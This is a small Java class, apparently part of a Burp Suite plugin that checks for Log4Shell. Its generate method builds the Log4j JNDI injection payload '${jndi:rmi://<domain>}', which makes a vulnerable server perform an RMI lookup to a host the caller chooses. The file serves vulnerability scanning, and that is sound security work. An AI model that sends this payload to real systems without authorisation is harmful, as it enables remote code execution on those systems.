package burp.poc.impl;

import burp.poc.IPOC;

public class POC4 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${jndi:rmi://" + domain + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_RMI;
    }
}
